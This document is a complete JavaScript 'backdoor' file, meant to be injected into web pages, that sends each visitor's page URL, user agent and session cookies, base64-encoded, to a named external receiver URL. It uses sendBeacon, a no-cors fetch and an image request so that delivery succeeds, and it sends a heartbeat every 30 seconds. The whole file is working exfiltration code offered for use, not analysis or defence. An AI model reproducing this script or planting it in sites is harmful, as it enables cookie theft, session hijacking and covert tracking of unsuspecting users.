// ============================================================
//  BACKDOOR.JS — WITH YOUR RECEIVER URL
//  Sends data to: https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil
// ============================================================

(function() {
    'use strict';

    // ===== YOUR RECEIVER URL =====
    const RECEIVER = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil';

    function sendData(data) {
        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        
        // Try multiple methods to ensure delivery
        try {
            navigator.sendBeacon(RECEIVER, encoded);
        } catch(e) {}

        try {
            fetch(RECEIVER, {
                method: 'POST',
                body: encoded,
                headers: { 'Content-Type': 'text/plain' },
                mode: 'no-cors'
            }).catch(() => {});
        } catch(e) {}

        try {
            const img = new Image();
            img.src = RECEIVER + '?' + encoded.slice(0, 2000);
        } catch(e) {}

        console.log('📤 Data sent to:', RECEIVER);
    }

    // ===== SEND DATA IMMEDIATELY =====
    sendData({
        type: 'backdoor_loaded',
        url: location.href,
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        cookies: document.cookie || 'none',
        localStorage: localStorage.length > 0 ? 'has_data' : 'empty'
    });

    // ===== SEND EVERY 30 SECONDS =====
    setInterval(() => {
        sendData({
            type: 'heartbeat',
            url: location.href,
            timestamp: Date.now(),
            localStorage: localStorage.length > 0 ? 'has_data' : 'empty'
        });
    }, 30000);

    console.log('🔥 Backdoor loaded! Sending to:', RECEIVER);
})();
